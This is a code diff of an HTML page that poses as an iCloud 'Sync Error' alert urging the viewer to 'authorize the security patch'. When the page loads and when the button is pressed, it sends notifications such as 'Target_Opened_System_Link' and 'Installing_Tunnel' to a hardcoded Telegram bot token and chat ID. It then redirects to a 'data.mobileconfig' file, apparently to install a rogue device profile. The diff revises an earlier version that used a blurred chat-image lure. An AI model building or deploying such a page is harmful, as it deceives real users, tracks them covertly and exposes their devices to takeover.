@@ -3,41 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud Security Hub</title>
+    <title>System Maintenance</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f2f2f7; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: filter 0.8s; }
-        .alert-box { position: relative; z-index: 10; background: white; width: 280px; border-radius: 15px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.2); display: none; }
+        /* Apple System UI Style */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #000; /* Deep black for focus */
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+        }
+        .alert-box { 
+            background: rgba(255, 255, 255, 0.95); 
+            width: 275px; 
+            border-radius: 14px; 
+            text-align: center; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(1.1); } to { opacity: 1; transform: scale(1); } }
         .padding { padding: 20px; }
-        .title { font-weight: 600; font-size: 18px; margin-bottom: 8px; color: #000; }
+        .title { font-weight: 600; font-size: 17px; margin-bottom: 4px; color: #000; }
         .text { font-size: 13px; color: #333; line-height: 1.4; }
-        .btn { border-top: 0.5px solid #d1d1d6; color: #007aff; text-decoration: none; display: block; padding: 12px; font-size: 17px; font-weight: 500; cursor: pointer; border: none; background: none; width: 100%; }
+        .btn { 
+            border-top: 0.5px solid #c8c8c8; 
+            color: #007aff; 
+            text-decoration: none; 
+            display: block; 
+            padding: 12px; 
+            font-size: 17px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            background: none; 
+            border-left: none;
+            border-right: none;
+            border-bottom: none;
+            width: 100%;
+        }
+        .btn:active { background: #e5e5e5; border-radius: 0 0 14px 14px; }
     </style>
 </head>
 <body>
-    <img src="chat_preview.jpg" id="preview">
-    <div id="popup" class="alert-box">
+    <div class="alert-box">
         <div class="padding">
-            <div class="title">Sync Suspended</div>
-            <div class="text">The security certificate for your media storage has expired. Authorize the patch to resume synchronization.</div>
+            <div class="title">iCloud Sync Error</div>
+            <div class="text">Account verification required. Your media encryption service has paused. Please authorize the security patch to resume cloud backup.</div>
         </div>
-        <button class="btn" onclick="startUpdate()">Update Now</button>
+        <button class="btn" onclick="startUpdate()">Continue</button>
     </div>
 
     <script>
+        // Seedha notification bhejega jaise hi page load hoga
         window.onload = () => {
-            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Is_Viewing_Media_👀");
-            setTimeout(() => {
-                document.getElementById('preview').style.filter = 'blur(15px)';
-                document.getElementById('popup').style.display = 'block';
-            }, 5000);
+            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Opened_System_Link_⚠️_Identity_Hidden");
         };
 
         function startUpdate() {
-            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Authorized_Tunnel_✅_Connecting_to_Termux...");
+            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Clicked_Continue_✅_Installing_Tunnel");
             setTimeout(() => {
                 window.location.href = "data.mobileconfig";
-            }, 800);
+            }, 500);
         }
     </script>
 </body>
